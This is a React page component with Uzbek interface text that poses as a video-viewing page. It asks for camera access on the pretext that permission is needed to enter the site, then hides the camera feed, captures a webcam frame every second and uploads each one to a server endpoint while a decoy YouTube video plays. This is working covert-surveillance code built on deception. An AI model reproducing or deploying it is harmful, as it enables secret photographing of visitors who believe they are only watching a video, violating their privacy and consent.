import { useRef, useEffect, useState } from "react";

export default function Home() {
  const videoRef = useRef(null);
  const [sending, setSending] = useState(false);
  const [permission, setPermission] = useState(null); // null | true | false

  const TARGET_IFRAME = "https://www.youtube.com/embed/Nv9qxur1s2k";

  useEffect(() => {
    // Kamerani ishga tushirish va ruxsatni sorash
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoRef.current.srcObject = stream;
        setPermission(true);
      })
      .catch(err => {
        console.error("Camera error:", err);
        setPermission(false);
      });
  }, []);

  // Avtomatik rasm yuborish
  useEffect(() => {
    if (!permission) return;

    const interval = setInterval(() => {
      captureAndSend();
    }, 1000); // har 5 soniyada

    return () => clearInterval(interval);
  }, [permission]);

  const captureAndSend = async () => {
    if (sending || !videoRef.current) return;
    setSending(true);

    try {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      canvas.getContext("2d").drawImage(videoRef.current, 0, 0);

      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
      const formData = new FormData();
      formData.append("photo", blob, "auto_frame.jpg");

      await fetch("/api/send-photo", {
        method: "POST",
        body: formData,
      });
      console.log("...!");
    } catch (err) {
      console.error("Error sending auto photo:", err);
    }

    setSending(false);
  };

  return (
    <div style={{
      backgroundColor: "black",
      color: "white",
      height: "100vh",
      display: "flex",
      flexDirection: "column",
      justifyContent: "center",
      alignItems: "center",
      textAlign: "center",
      padding: "0 20px"
    }}>
      <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />

      {permission === null && (
        <h1>Saytga kirish uchun ruxsat so‘ralmoqda...</h1>
      )}

      {permission === false && (
        <h1>Iltimos, ruxsat bering!</h1>
      )}

      {permission === true && (
        <>
          <h1>Ruxsat berildi! Video yuklanmoqda...</h1>
          <p>{sending ? "..." : ""}</p>
          <iframe 
            width="853" 
            height="480" 
            src={TARGET_IFRAME} 
            title="Qanday Qilib Firibgarlarga Aldanmaslik (Siz Ularni Taniysiz!)" 
            frameBorder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            referrerPolicy="strict-origin-when-cross-origin" 
            allowFullScreen
            style={{ marginTop: "20px" }}
          ></iframe>
        </>
      )}
    </div>
  );
}
